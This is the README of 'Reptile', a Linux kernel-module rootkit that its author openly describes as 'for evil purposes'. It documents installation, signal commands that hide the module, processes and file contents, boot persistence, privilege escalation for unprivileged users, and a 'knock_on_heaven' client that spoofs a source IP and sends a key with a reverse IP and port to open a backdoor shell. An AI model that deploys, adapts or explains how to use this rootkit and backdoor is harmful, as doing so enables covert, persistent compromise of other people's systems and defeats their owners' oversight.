# Reptile

Reptile is a LKM rootkit for evil purposes. If you are searching stuff only for study purposes, see the [demonstration codes](https://github.com/f0rb1dd3n/papers/tree/master/rootkit_demonstration).

## Features

- Give root to unprivileged users
- Hide files and directories
- Hide files contents
- Hide processes
- Hide himself
- Boot persistence
- Heaven's door - A ICMP/UDP/TCP port-knocking backdoor
- Client to knock on heaven's door :D
    
## Install
```
apt-get install linux-headers-$(uname -r)
https://github.com/f0rb1dd3n/Reptile.git
cd Reptile
./installer.sh install
```
## Uninstall
```
kill -50 0
rmmod reptile_mod
./install.sh uninstall
```

## Usage

Binaries will be copied to `/reptile` folder, that will be hidden by Reptile.

### Getting root privileges

<img src="https://i.imgur.com/UNTqrHP.png">

### Hiding

- Hide/unhide reptile module: `kill -50 0`
- Hide/unhide process: `kill -49 <PID>`
- Hide files contents: `kill -51 0` and all content between the tags will be hidden

Example:
```
#<reptile> 
content to hide 
#</reptile>
```

### Knocking on heaven's door

Heaven's door is a ICMP/UDP/TCP port-knocking backdoor used by Reptile. To access the backdoor you can use the client: 
```
Knock Knock on Heaven's Door
Written by: F0rb1dd3n

Usage: ./knock_on_heaven <args>

-x      Protocol (ICMP/UDP/TCP)
-s      Source IP address (You can spoof)
-t      Target IP address
-p      Source Port
-q      Target Port
-d      Data to knock on backdoor: "<key> <reverse IP> <reverse Port>"
-l      Launch listener

[!] ICMP doesn't need ports

ICMP: ./knock_on_heaven -x icmp -s 192.168.0.2 -t 192.168.0.3 -d "F0rb1dd3n 192.168.0.4 4444" -l
UDP:  ./knock_on_heaven -x udp  -s 192.168.0.2 -t 192.168.0.3 -p 666 -q 53 -d "F0rb1dd3n 192.168.0.4 4444" -l
TCP:  ./knock_on_heaven -x tcp  -s 192.168.0.2 -t 192.168.0.3 -p 666 -q 80 -d "F0rb1dd3n 192.168.0.4 4444" -l

```
<img src="https://i.imgur.com/zvFWuXT.png">

## Disclaimer

Some functions of this module is based on another rootkits. Please see the references!

## References

- “[LKM HACKING](http://www.ouah.org/LKM_HACKING.html)”, The Hackers Choice (THC), 1999;
- https://github.com/m0nad/Diamorphine.git
- https://github.com/David-Reguera-Garcia-Dreg/enyelkm.git
- https://github.com/maK-/maK_it-Linux-Rootkit
- “[Abuse of the Linux Kernel for Fun and Profit](http://phrack.org/issues/50/5.html)”, Halflife, Phrack 50, 1997;
- https://ruinedsec.wordpress.com/2013/04/04/modifying-system-calls-dispatching-linux/
